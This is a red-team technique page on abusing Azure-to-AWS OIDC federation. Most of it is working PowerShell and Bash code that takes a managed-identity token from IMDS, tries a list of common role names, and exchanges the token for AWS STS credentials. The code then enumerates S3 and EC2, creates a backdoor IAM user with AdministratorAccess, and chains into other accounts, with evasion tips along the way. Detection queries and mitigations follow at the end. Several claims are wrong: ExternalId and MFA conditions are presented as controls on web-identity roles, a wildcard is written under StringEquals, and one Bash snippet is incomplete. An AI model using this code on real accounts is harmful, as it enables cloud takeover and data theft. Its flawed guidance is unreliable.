# [CA-TOKEN-019]: AWS STS Token Abuse via Azure

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-019 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access / Lateral Movement |
| **Platforms** | Cross-Cloud (Azure to AWS) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | Azure (all versions), AWS STS (all versions), OIDC federation (all versions) |
| **Patched In** | Mitigation via strict role trust policies and ExternalID enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 4 (Environmental Reconnaissance) and 6 (Atomic Red Team) not included because: (1) Reconnaissance is implicit in execution methods; (2) No standalone Atomic test exists for AWS STS exploitation via Azure federation. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** AWS STS token abuse via Azure exploits the trust relationship between Azure managed identities (or Entra ID application registrations) and AWS IAM roles configured to accept OIDC federation. An attacker who compromises an Azure resource (VM, Function, App Service) or an Entra ID application registration can use the Azure OIDC token to request temporary AWS credentials via the AWS Security Token Service (STS) `AssumeRoleWithWebIdentity` API. If the AWS role trust policy is misconfigured (missing `ExternalID`, overly permissive conditions, or no condition restrictions), the attacker can assume AWS roles across accounts, escalate privileges, and access sensitive AWS resources without ever needing AWS credentials directly.

**Attack Surface:**
- **Azure managed identities** attached to VMs, Functions, App Services with OIDC token access
- **AWS IAM roles** configured with Azure Entra ID as a trusted identity provider
- **STS AssumeRoleWithWebIdentity** API endpoint vulnerable to over-permissive trust policies
- **OIDC federation** without proper ExternalID validation
- **Azure DevOps service connections** with AWS role assumption permissions
- **Azure Automation** runbooks accessing AWS resources via assumed roles
- **CI/CD pipelines** (Azure Pipelines, GitHub Actions) exchanging OIDC tokens for AWS access

**Business Impact:** **Complete compromise of AWS accounts and resources via Azure federation.** An attacker with a compromised Azure resource can:
- Assume administrative roles in AWS accounts without requiring AWS credentials
- Access all AWS resources (S3 buckets, EC2 instances, RDS databases, Lambda functions)
- Exfiltrate data from AWS production environments
- Deploy cryptominers or ransomware using AWS Lambda or EC2
- Create backdoors in AWS via IAM user creation or role policy modification
- Move laterally from Azure infrastructure to AWS infrastructure seamlessly
- Maintain persistent access through cross-cloud role assumption

**Technical Context:** AWS STS token abuse via Azure typically occurs after compromising an Azure resource with a managed identity or exploiting misconfigured Entra ID app registrations. The attack is extremely fast—token exchange takes milliseconds—and has very low detection likelihood because AWS sees legitimate-looking STS API calls from a valid OIDC provider. Reversibility is extremely difficult; once an AWS role trust policy is misconfigured, attackers have persistent cross-cloud access until the trust relationship is reconfigured and tokens are invalidated.

### Operational Risk

- **Execution Risk:** **Low** — Requires only Azure OIDC token (always available on compromised Azure resources); no AWS credentials needed.
- **Stealth:** **Very High** — AWS STS calls appear legitimate; cross-cloud pattern only detectable through centralized monitoring.
- **Reversibility:** **No** — Cross-cloud role assumption persists until trust policy is modified; logs may not clearly show the Azure origin.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.1, 1.12 | Ensure IAM policies and cross-account roles are least privilege; audit root account usage |
| **DISA STIG** | AC-2, AC-5 | Account management and access control for privileged accounts |
| **CISA SCuBA** | CR.AM-1 | Asset management of cloud accounts and trust relationships |
| **NIST 800-53** | AC-3, AC-5, SC-7 | Access control; separation of duties; boundary protection for federated access |
| **GDPR** | Art. 32 | Security of processing; protect cross-border data transfer controls |
| **DORA** | Art. 9 | Protection and prevention of identity-based cross-cloud attacks |
| **NIS2** | Art. 21 | Cyber Risk Management; incident response for cross-cloud incidents |
| **ISO 27001** | A.9.1.1, A.9.2.3 | Authentication; privileged access management across trust boundaries |
| **ISO 27005** | Risk Scenario: "Unauthorized Cross-Cloud Access" | Lateral movement across cloud boundaries |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Access to Azure VM, Function, App Service, or compromised Entra ID app registration with OIDC token capability
- **Ideal:** Managed identity with `AssumeAWSRole` application role or sufficient Entra ID app permissions

**Required Access:**
- Network connectivity to Azure IMDS (169.254.169.254) from compromised Azure resource
- Network connectivity to AWS STS endpoint (`sts.amazonaws.com`) from Azure resource
- AWS account ID and role name (often discoverable via source code, configuration files, or enumeration)

**Supported Versions:**
- **Azure:** Managed identities (all versions), Entra ID (all versions)
- **AWS:** STS (all versions), IAM (all versions)
- **Protocols:** OIDC (OpenID Connect), OAuth 2.0

**Tools:**
- [Invoke-WebRequest / curl](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest) (Built-in)
- [AWS CLI](https://docs.aws.amazon.com/cli/) (Version 2.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [jq / Python](https://stedolan.github.io/jq/) (For JSON parsing)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Assume AWS Role via Azure Managed Identity OIDC Token

**Supported Versions:** Azure VMs/Functions with managed identities, AWS STS (all versions)

#### Step 1: Query Azure IMDS for OIDC Token

**Objective:** Extract OIDC-compliant JWT token from Azure Instance Metadata Service.

**Command (PowerShell on Azure VM):**
```powershell
# Query Azure IMDS for OIDC token (format compatible with AWS STS)
$tokenEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token"

# AWS expects OIDC token from trusted provider
# Use resource parameter to get correct token format
$params = @{
    Uri     = "$tokenEndpoint?api-version=2018-02-01&resource=https://iam.amazonaws.com/&client_id=<OPTIONAL_MANAGED_IDENTITY_CLIENT_ID>"
    Headers = @{ "Metadata" = "true" }
    Method  = "Get"
}

try {
    $response = Invoke-WebRequest @params -UseBasicParsing
    $oidcToken = ($response.Content | ConvertFrom-Json).access_token
    
    Write-Host "[+] Successfully obtained Azure OIDC token" -ForegroundColor Green
    Write-Host "[+] Token (truncated): $($oidcToken.Substring(0, 50))..." -ForegroundColor Yellow
    
    $env:AZURE_OIDC_TOKEN = $oidcToken
}
catch {
    Write-Host "[-] Failed to obtain OIDC token: $_" -ForegroundColor Red
}
```

**Command (Bash on Azure VM):**
```bash
# Query Azure IMDS for OIDC token
OIDC_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"

OIDC_TOKEN=$(curl -s -H "Metadata:true" \
  "$OIDC_ENDPOINT?api-version=2018-02-01&resource=https://iam.amazonaws.com/" | jq -r '.access_token')

if [ ! -z "$OIDC_TOKEN" ]; then
    echo "[+] Successfully obtained Azure OIDC token"
    echo "[+] Token (first 50 chars): ${OIDC_TOKEN:0:50}..."
    export AZURE_OIDC_TOKEN=$OIDC_TOKEN
else
    echo "[-] Failed to obtain token"
fi
```

**Expected Output:**
```
[+] Successfully obtained Azure OIDC token
[+] Token (truncated): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ijk...
```

**What This Means:**
- Token is valid OIDC JWT issued by Azure Entra ID
- Token can be exchanged with AWS STS for temporary AWS credentials
- Token is valid for 1 hour from issuance

**OpSec & Evasion:**
- IMDS queries are not logged by default in Azure Monitor
- AWS STS calls appear as legitimate federation activity
- Detection likelihood: **Low** — unless cross-cloud monitoring is enabled
- Use environment variables to avoid command-line exposure

#### Step 2: Discover Target AWS Account ID and Role Name

**Objective:** Enumerate AWS resources to find target role ARN.

**Command (PowerShell - Reconnaissance):**
```powershell
# Method 1: Hardcoded role ARN (attacker knows from previous recon, source code, or config)
$targetRoleArn = "arn:aws:iam::111111111111:role/CrossAccountAssumeRole"

# Method 2: Brute-force role names (if account ID is known)
$accountId = "111111111111"
$commonRoles = @(
    "CrossAccountAssumeRole",
    "AzureToAWSRole",
    "AssumeAWSRole",
    "ServiceRole",
    "AdministratorRole",
    "PowerUserRole",
    "AdminAccess",
    "DeveloperRole",
    "ProductionRole"
)

Write-Host "[+] Attempting to discover AWS role..." -ForegroundColor Yellow

foreach ($roleName in $commonRoles) {
    $roleArn = "arn:aws:iam::$accountId`:role/$roleName"
    Write-Host "    Checking: $roleArn" -ForegroundColor Gray
}

# Method 3: Find from Azure resource metadata (if set)
# Check environment variables, config files, or Azure App Configuration
$foundRoleArn = $env:AWS_ROLE_ARN  # May be set by Azure application
if ($foundRoleArn) {
    Write-Host "[+] Found AWS role ARN from environment: $foundRoleArn" -ForegroundColor Green
}
```

**Expected Output:**
```
[+] Attempting to discover AWS role...
    Checking: arn:aws:iam::111111111111:role/CrossAccountAssumeRole
    Checking: arn:aws:iam::111111111111:role/AzureToAWSRole
...
[+] Found AWS role ARN from environment: arn:aws:iam::111111111111:role/AzureToAWSRole
```

**What This Means:**
- Attacker has identified the target AWS role to assume
- Role ARN is in format: `arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME`

#### Step 3: Exchange OIDC Token for AWS STS Credentials

**Objective:** Call AWS STS to exchange Azure OIDC token for temporary AWS credentials.

**Command (PowerShell):**
```powershell
# Prepare for STS token exchange
$oidcToken = $env:AZURE_OIDC_TOKEN
$roleArn = "arn:aws:iam::111111111111:role/AzureToAWSRole"
$sessionName = "AzureToAWSSession"

# AWS STS endpoint for AssumeRoleWithWebIdentity
$stsEndpoint = "https://sts.amazonaws.com/"

# Build STS request using AWS Signature V4 or direct HTTPS
# Direct method (no credentials needed for AssumeRoleWithWebIdentity if role trust policy allows)

$stsParams = @{
    Action                  = "AssumeRoleWithWebIdentity"
    RoleArn                 = $roleArn
    RoleSessionName         = $sessionName
    WebIdentityToken        = $oidcToken
    DurationSeconds         = 3600
    Version                 = "2011-06-15"
}

# Build query string
$queryString = ($stsParams.GetEnumerator() | ForEach-Object { "$($_.Key)=$([URI]::EscapeDataString($_.Value))" }) -join "&"
$stsUrl = "$stsEndpoint`?$queryString"

Write-Host "[+] Calling AWS STS AssumeRoleWithWebIdentity..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $stsUrl -UseBasicParsing
    $credentials = ([xml]$response.Content).AssumeRoleWithWebIdentityResponse.AssumeRoleWithWebIdentityResult.Credentials
    
    Write-Host "[+] Successfully obtained AWS credentials!" -ForegroundColor Green
    Write-Host "    Access Key ID: $($credentials.AccessKeyId)" -ForegroundColor Yellow
    Write-Host "    Secret Access Key: $($credentials.SecretAccessKey.Substring(0, 20))..." -ForegroundColor Yellow
    Write-Host "    Session Token: $($credentials.SessionToken.Substring(0, 20))..." -ForegroundColor Yellow
    Write-Host "    Expiration: $($credentials.Expiration)" -ForegroundColor Green
    
    # Store credentials for use
    $env:AWS_ACCESS_KEY_ID = $credentials.AccessKeyId
    $env:AWS_SECRET_ACCESS_KEY = $credentials.SecretAccessKey
    $env:AWS_SESSION_TOKEN = $credentials.SessionToken
}
catch {
    Write-Host "[-] STS AssumeRole failed: $_" -ForegroundColor Red
    Write-Host "    Possible causes:" -ForegroundColor Yellow
    Write-Host "    - Role trust policy does not allow Azure Entra ID OIDC" -ForegroundColor Yellow
    Write-Host "    - Missing ExternalID validation" -ForegroundColor Yellow
    Write-Host "    - OIDC provider not configured in AWS account" -ForegroundColor Yellow
}
```

**Command (Bash using AWS CLI):**
```bash
# Assume AWS role using Azure OIDC token via AWS CLI
OIDC_TOKEN="${AZURE_OIDC_TOKEN}"
ROLE_ARN="arn:aws:iam::111111111111:role/AzureToAWSRole"
SESSION_NAME="AzureToAWSSession"

# AWS CLI requires proper configuration; here we use AWS STS directly
aws sts assume-role-with-web-identity \
  --role-arn "$ROLE_ARN" \
  --role-session-name "$SESSION_NAME" \
  --web-identity-token "$OIDC_TOKEN" \
  --duration-seconds 3600 \
  --region us-east-1 2>/dev/null

# Extract credentials from response
if [ $? -eq 0 ]; then
    echo "[+] Successfully assumed AWS role"
    # Parse credentials from JSON response
    AWS_ACCESS_KEY=$(aws sts assume-role-with-web-identity ... | jq -r '.Credentials.AccessKeyId')
    AWS_SECRET=$(aws sts assume-role-with-web-identity ... | jq -r '.Credentials.SecretAccessKey')
    AWS_TOKEN=$(aws sts assume-role-with-web-identity ... | jq -r '.Credentials.SessionToken')
    export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
    export AWS_SECRET_ACCESS_KEY=$AWS_SECRET
    export AWS_SESSION_TOKEN=$AWS_TOKEN
else
    echo "[-] Failed to assume role"
fi
```

**Expected Output:**
```
[+] Successfully obtained AWS credentials!
    Access Key ID: ASIAI6EXAMPLEKEY12345
    Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY...
    Session Token: FwoGZXIvYXdzEG0aDIw/tpuDmjH5Cgl2vyK1AZokVNmz...
    Expiration: 2026-01-08T11:30:00Z
```

**What This Means:**
- Attacker now has temporary AWS credentials valid for 1 hour
- Credentials are session tokens (very short-lived, harder to detect in logs)
- Credentials grant all permissions of the assumed AWS role

#### Step 4: Use AWS Credentials to Access AWS Resources

**Objective:** Leverage stolen AWS credentials to exfiltrate data or establish persistence.

**Command (PowerShell):**
```powershell
# Set AWS credentials from assumed role
$env:AWS_ACCESS_KEY_ID = "ASIAI6EXAMPLEKEY12345"
$env:AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
$env:AWS_SESSION_TOKEN = "FwoGZXIvYXdzEG0aDIw/tpuDmjH5Cgl2vyK1AZokVNmz"

# Query AWS S3 buckets
Write-Host "[+] Querying S3 buckets in target AWS account..." -ForegroundColor Yellow

try {
    $s3Uri = "https://s3.amazonaws.com/"
    $headers = @{
        "Authorization" = "AWS4-HMAC-SHA256 Credential=$env:AWS_ACCESS_KEY_ID/20260108/us-east-1/s3/aws4_request..."
    }
    
    # Use AWS CLI for easier access
    $output = aws s3 ls --no-verify-ssl 2>&1
    
    Write-Host "[+] S3 Buckets found:" -ForegroundColor Green
    Write-Host $output
}
catch {
    Write-Host "[-] S3 query failed: $_" -ForegroundColor Red
}

# List EC2 instances
Write-Host "`n[+] Querying EC2 instances..." -ForegroundColor Yellow

try {
    $instances = aws ec2 describe-instances --region us-east-1 --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,PublicIpAddress]' --output table
    Write-Host "[+] EC2 Instances found:" -ForegroundColor Green
    Write-Host $instances
}
catch {
    Write-Host "[-] EC2 query failed: $_" -ForegroundColor Red
}

# Create IAM user for persistence
Write-Host "`n[+] Attempting to create IAM user for persistence..." -ForegroundColor Yellow

try {
    aws iam create-user --user-name AzureAdminUser --no-verify-ssl 2>&1 | Out-Null
    aws iam create-access-key --user-name AzureAdminUser --no-verify-ssl 2>&1 | Out-Null
    aws iam attach-user-policy --user-name AzureAdminUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --no-verify-ssl
    
    Write-Host "[+] Created backdoor IAM user 'AzureAdminUser' with administrator access" -ForegroundColor Green
}
catch {
    Write-Host "[-] IAM user creation failed (may lack permissions): $_" -ForegroundColor Red
}
```

**Command (Bash):**
```bash
# Set AWS credentials
export AWS_ACCESS_KEY_ID="ASIAI6EXAMPLEKEY12345"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEG0aDIw/tpuDmjH5Cgl2vyK1AZokVNmz"

echo "[+] Querying S3 buckets..."
aws s3 ls

echo "[+] Querying EC2 instances..."
aws ec2 describe-instances --region us-east-1 --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,PublicIpAddress]' --output table

echo "[+] Creating backdoor IAM user..."
aws iam create-user --user-name AzureBackdoorUser
aws iam attach-user-policy --user-name AzureBackdoorUser --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Expected Output:**
```
[+] S3 Buckets found:
2026-01-08 10:15:23 prod-database-backups
2026-01-08 09:45:12 dev-logs-archive
2026-01-08 08:30:01 customer-data-vault

[+] EC2 Instances found:
INSTANCE ID            | INSTANCE TYPE | PUBLIC IP
i-0123456789abcdef0    | t3.large      | 10.0.1.42
i-0987654321fedcba0    | m5.xlarge     | 10.0.2.15

[+] Created backdoor IAM user 'AzureAdminUser' with administrator access
```

**OpSec & Evasion:**
- AWS API calls appear as legitimate activity from assumed role
- Session token usage is harder to track than long-term credentials
- IAM user creation is auditable but may not trigger alerts if permissions allow
- Detection likelihood: **Medium** — CloudTrail logs all API calls; cross-cloud origin may be missed

---

### METHOD 2: Exploiting Misconfigured ExternalID in AWS Role Trust Policy

**Supported Versions:** AWS IAM (all versions)

#### Step 1: Identify Role Without ExternalID Validation

**Objective:** Discover AWS roles that lack ExternalID checks, allowing any OIDC token to assume them.

**Command (PowerShell - Role Trust Policy Analysis):**
```powershell
# If attacker has access to AWS role definition (via source control or enumeration):
# Examine trust policy for weak conditions

$trustPolicy = @'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::111111111111:saml-provider/AzureADProvider"
      },
      "Action": "sts:AssumeRoleWithSAML",
      "Condition": {
        "StringEquals": {
          "SAML:aud": "https://signin.aws.amazon.com/saml"
        }
      }
    },
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::111111111111:oidc-provider/oidc.prod.cloud.ibm.com/id"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "oidc.prod.cloud.ibm.com/id:sub": "*"
        }
      }
    }
  ]
}
'@

Write-Host "[+] Analyzing AWS role trust policy for weaknesses:" -ForegroundColor Yellow

$policy = $trustPolicy | ConvertFrom-Json

foreach ($statement in $policy.Statement) {
    Write-Host "`nStatement for: $($statement.Principal.Federated)" -ForegroundColor Yellow
    
    # Check for missing ExternalID
    if (-not $statement.Condition.StringEquals."aws:SourceAccount" -and -not $statement.Condition.StringEquals.ExternalId) {
        Write-Host "    [!] VULNERABILITY: No ExternalID or SourceAccount condition found" -ForegroundColor Red
        Write-Host "        Any OIDC token can assume this role!" -ForegroundColor Red
    }
    
    # Check for wildcard subjects
    if ($statement.Condition.StringEquals."oidc.prod.cloud.ibm.com/id:sub" -eq "*") {
        Write-Host "    [!] VULNERABILITY: Wildcard subject (*) allows any token issuer" -ForegroundColor Red
    }
}
```

**Expected Output:**
```
[+] Analyzing AWS role trust policy for weaknesses:

Statement for: arn:aws:iam::111111111111:oidc-provider/oidc.prod.cloud.ibm.com/id
    [!] VULNERABILITY: No ExternalID or SourceAccount condition found
        Any OIDC token can assume this role!
    [!] VULNERABILITY: Wildcard subject (*) allows any token issuer
```

**What This Means:**
- Role trust policy lacks proper ExternalID validation
- Any OIDC token from the federated provider can assume this role
- Attacker can use Azure OIDC token to assume this role without restriction

#### Step 2: Assume Role Without Valid ExternalID

**Objective:** Exploit missing ExternalID to assume the misconfigured role.

**Command (PowerShell):**
```powershell
# Use Azure OIDC token even though ExternalID is expected
$oidcToken = $env:AZURE_OIDC_TOKEN
$roleArn = "arn:aws:iam::111111111111:role/MisconfiguredRole"
$sessionName = "ExploitSession"

Write-Host "[+] Attempting to assume role WITHOUT ExternalID..." -ForegroundColor Yellow

try {
    # Call AWS STS without ExternalID
    $response = aws sts assume-role-with-web-identity `
      --role-arn $roleArn `
      --role-session-name $sessionName `
      --web-identity-token $oidcToken `
      --duration-seconds 3600 `
      --region us-east-1 2>&1
    
    if ($response -match "AccessDenied") {
        Write-Host "[-] AssumeRole denied (role likely has ExternalID)" -ForegroundColor Red
    }
    else {
        Write-Host "[+] Successfully assumed role WITHOUT ExternalID!" -ForegroundColor Green
        $credentials = $response | ConvertFrom-Json
        Write-Host "    Access Key: $($credentials.Credentials.AccessKeyId)" -ForegroundColor Green
    }
}
catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
}
```

---

### METHOD 3: Assuming Cross-Account AWS Roles via Azure Chaining

**Supported Versions:** AWS STS (all versions), cross-account role assumption (all versions)

#### Step 1: Assume Primary AWS Role via Azure OIDC

**Objective:** Use Azure token to assume a delegated cross-account role in AWS.

**Command (PowerShell):**
```powershell
# First-level role assumption (Azure to AWS Account A)
$oidcToken = $env:AZURE_OIDC_TOKEN
$primaryRoleArn = "arn:aws:iam::111111111111:role/AzureDelegatedRole"

$primaryCreds = aws sts assume-role-with-web-identity `
  --role-arn $primaryRoleArn `
  --role-session-name "PrimaryAssumption" `
  --web-identity-token $oidcToken `
  --duration-seconds 3600 | ConvertFrom-Json

Write-Host "[+] Assumed primary AWS role in Account 111111111111" -ForegroundColor Green

# Export credentials
$env:AWS_ACCESS_KEY_ID = $primaryCreds.Credentials.AccessKeyId
$env:AWS_SECRET_ACCESS_KEY = $primaryCreds.Credentials.SecretAccessKey
$env:AWS_SESSION_TOKEN = $primaryCreds.Credentials.SessionToken
```

#### Step 2: Use Primary Credentials to Assume Cross-Account Role

**Objective:** Chain role assumptions to access resources in different AWS account.

**Command (PowerShell):**
```powershell
# Second-level role assumption (Account A → Account B)
# Use credentials from step 1 to assume role in different account

$crossAccountRoleArn = "arn:aws:iam::222222222222:role/CrossAccountAccessRole"

Write-Host "[+] Attempting second-level role assumption (cross-account)..." -ForegroundColor Yellow

try {
    $crossAccountCreds = aws sts assume-role `
      --role-arn $crossAccountRoleArn `
      --role-session-name "CrossAccountSession" `
      --duration-seconds 3600 | ConvertFrom-Json
    
    Write-Host "[+] Successfully chained role assumption!" -ForegroundColor Green
    Write-Host "    Now have access to Account 222222222222" -ForegroundColor Green
    
    # Export new credentials
    $env:AWS_ACCESS_KEY_ID = $crossAccountCreds.Credentials.AccessKeyId
    $env:AWS_SECRET_ACCESS_KEY = $crossAccountCreds.Credentials.SecretAccessKey
    $env:AWS_SESSION_TOKEN = $crossAccountCreds.Credentials.SessionToken
    
    # Can now access resources in Account B
    $buckets = aws s3 ls
    Write-Host "[+] S3 buckets in Account B:" -ForegroundColor Green
    Write-Host $buckets
}
catch {
    Write-Host "[-] Cross-account assumption failed: $_" -ForegroundColor Red
}
```

---

## 7. TOOLS & COMMANDS REFERENCE

### [AWS CLI](https://docs.aws.amazon.com/cli/)

**Version:** 2.0+  
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install awscli

# Linux
curl "https://awscli.amazonaws.com/awscliv2.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install

# Windows
choco install awscli
```

**Usage for STS Role Assumption:**
```bash
# Assume role with web identity (OIDC token from Azure)
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/RoleName \
  --role-session-name SessionName \
  --web-identity-token <AZURE_OIDC_TOKEN> \
  --duration-seconds 3600

# Assume secondary role (cross-account chaining)
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/RoleName \
  --role-session-name SessionName \
  --duration-seconds 3600

# Get caller identity
aws sts get-caller-identity
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: AWS STS AssumeRoleWithWebIdentity from Unknown OIDC Provider

**Rule Configuration:**
- **Required Index:** `aws_cloudtrail`
- **Required Sourcetype:** `aws:cloudtrail`
- **Required Fields:** `eventName`, `userIdentity.principalId`, `sourceIPAddress`, `requestParameters.roleArn`
- **Alert Threshold:** Any AssumeRoleWithWebIdentity event
- **Applies To Versions:** All AWS accounts

**SPL Query:**
```spl
index=aws_cloudtrail eventName=AssumeRoleWithWebIdentity
| search userIdentity.principalId=*oidc-provider*
| where NOT sourceIPAddress IN ("10.0.0.0/8", "172.16.0.0/12")
| stats count by sourceIPAddress, userIdentity.principalId, requestParameters.roleArn, eventTime
| table eventTime, sourceIPAddress, userIdentity.principalId, requestParameters.roleArn, count
```

**What This Detects:**
- AssumeRoleWithWebIdentity calls from OIDC providers
- Calls from unusual source IPs (especially external IPs)
- Potential cross-cloud token abuse

### Rule 2: Successful STS AssumeRole Immediately Followed by IAM Modifications

**Rule Configuration:**
- **Required Index:** `aws_cloudtrail`
- **Required Sourcetype:** `aws:cloudtrail`
- **Alert Threshold:** STS assume + IAM modification within 5 minutes from same principal

**SPL Query:**
```spl
index=aws_cloudtrail
| search (eventName=AssumeRole OR eventName=AssumeRoleWithWebIdentity) OR (eventName=CreateUser OR eventName=AttachUserPolicy OR eventName=CreateAccessKey)
| transaction userIdentity.principalId maxpause=5m
| where eventCount > 1 AND eventName="AssumeRole*" AND (eventName="CreateUser" OR eventName="AttachUserPolicy")
| table _time, userIdentity.principalId, eventName, requestParameters.roleName, requestParameters.userName
```

**What This Detects:**
- Suspicious pattern of: assume role → create IAM user/access key (persistence)
- Cross-account lateral movement followed by backdoor creation

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Azure OIDC Token Used for AWS Access

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs` (Azure side); integration with AWS CloudTrail data
- **Alert Severity:** High
- **Applies To Versions:** All Azure/AWS versions

**KQL Query:**
```kusto
// Detect Azure OIDC token generation followed by AWS API calls
let AzureTokenTime = SigninLogs
| where AppDisplayName has "AWS" or ResourceDisplayName has "AWS"
| where TokenIssuerType == "AzureAD"
| project TimeGenerated, UserPrincipalName, IPAddress, ResourceDisplayName, TokenId = AuthenticationDetails;

let AWSActivity = SigninLogs
| where ResourceDisplayName has "AWS"
| where TimeGenerated > ago(1h)
| project TimeGenerated, IPAddress;

AzureTokenTime
| join kind=inner (AWSActivity) on IPAddress
| where TimeGenerated1 < TimeGenerated
| project TokenGenerationTime = TimeGenerated, AWSAccessTime = TimeGenerated1, UserPrincipalName, IPAddress, ResourceDisplayName
```

**Manual Configuration (Azure Portal):**
1. Go to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. Paste KQL query
3. **Severity:** High
4. **Frequency:** Every 5 minutes

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Logon) + Application-specific OIDC token logs**
- **Log Source:** Security Event Log (Azure-connected servers), Application logs
- **Trigger:** OIDC token generation from IMDS + Outbound HTTPS to AWS STS
- **Applies To Versions:** Windows Server 2016+, with Azure agent installed

**Manual Configuration:**
```powershell
# Enable Azure connected machine agent logging
# Monitor for IMDS access patterns
Get-WinEvent -FilterHashtable @{LogName="Microsoft-AzureConnectedMachine-Agent/Operational"} -MaxEvents 50 | 
  Where-Object {$_.Message -like "*token*" -or $_.Message -like "*credential*"} |
  Select-Object TimeCreated, Message
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Strict ExternalID Validation on All AWS Roles**
  - **Applies To Versions:** AWS IAM (all versions)
  - **Impact:** Prevents unauthorized OIDC token exchanges even if provider is compromised
  
  **Manual Steps (AWS Console):**
  1. Go to **IAM** → **Roles**
  2. Select role with external federation
  3. Click **Trust relationships** → **Edit trust policy**
  4. Add condition for ExternalID:
     ```json
     {
       "Condition": {
         "StringEquals": {
           "sts.amazonaws.com:ExternalId": "UNIQUE_SECRET_VALUE_HERE"
         }
       }
     }
     ```
  5. Click **Update Trust Policy**

- **Enforce MFA Requirement for Cross-Account Role Assumption**
  - **Applies To Versions:** AWS IAM (all versions)
  
  **Manual Steps:**
  1. Add MFA condition to role trust policy:
     ```json
     {
       "Condition": {
         "Bool": {
           "aws:MultiFactorAuthPresent": "true"
         }
       }
     }
     ```
  2. This prevents automated token exchange without MFA

- **Disable OIDC Federation for Unnecessary Azure Resources**
  - **Applies To Versions:** Azure (all versions)
  - Remove OIDC provider configuration from AWS if not actively used
  
  **Manual Steps (AWS IAM Console):**
  1. Go to **IAM** → **Identity Providers**
  2. Select Azure OIDC provider
  3. Click **Delete**
  4. Confirm deletion

- **Rotate AWS OIDC Provider Thumbprints**
  - **Impact:** Invalidates all existing OIDC tokens; forces re-authentication
  - **Applies To Versions:** AWS IAM (all versions)
  
  **Manual Steps:**
  1. Go to **IAM** → **Identity Providers**
  2. Select Azure provider
  3. Click **Edit**
  4. Update **Thumbprint** to current Azure signing certificate
  5. Save

### Priority 2: HIGH

- **Implement Least-Privilege AWS Role Permissions**
  - Remove `AdministratorAccess` from roles that only need specific permissions
  - Use inline policies instead of managed policies
  
  **Manual Steps:**
  1. Go to **IAM** → **Roles** → Select role
  2. Click **Permissions** → **Remove** all unnecessary policies
  3. Create inline policy with minimal permissions:
     ```json
     {
       "Version": "2012-10-17",
       "Statement": [
         {
           "Effect": "Allow",
           "Action": ["s3:GetObject"],
           "Resource": "arn:aws:s3:::specific-bucket/*"
         }
       ]
     }
     ```

- **Enable CloudTrail Logging for All AWS Accounts**
  - Ensures all STS API calls are logged for forensic analysis
  
  **Manual Steps:**
  1. Go to **CloudTrail** → **Trails** → **Create trail**
  2. Enable logging to S3
  3. Enable log file validation
  4. Enable for all regions

- **Implement IP Address Restrictions**
  - Restrict role assumption to specific IP ranges (Azure datacenter IPs)
  
  **Manual Steps:**
  1. Add condition to role trust policy:
     ```json
     {
       "Condition": {
         "IpAddress": {
           "aws:SourceIp": [
             "13.89.0.0/16",
             "13.90.0.0/15"
           ]
         }
       }
     }
     ```

- **Validation Command (Verify Mitigations):**
  ```bash
  # Check role trust policy for ExternalID
  aws iam get-role --role-name RoleName | jq '.Role.AssumeRolePolicyDocument'
  
  # Check for MFA condition
  aws iam get-role --role-name RoleName | jq '.Role.AssumeRolePolicyDocument.Statement[].Condition'
  
  # List OIDC providers
  aws iam list-open-id-connect-providers
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **CloudTrail Events:**
  - `AssumeRoleWithWebIdentity` from Entra ID OIDC provider
  - `AssumeRole` immediately after OIDC exchange
  - Unusual source IP or user agent for STS calls

- **API Patterns:**
  - Rapid succession of STS calls followed by resource enumeration (S3, EC2, IAM)
  - Create/Attach policy followed by IAM user creation
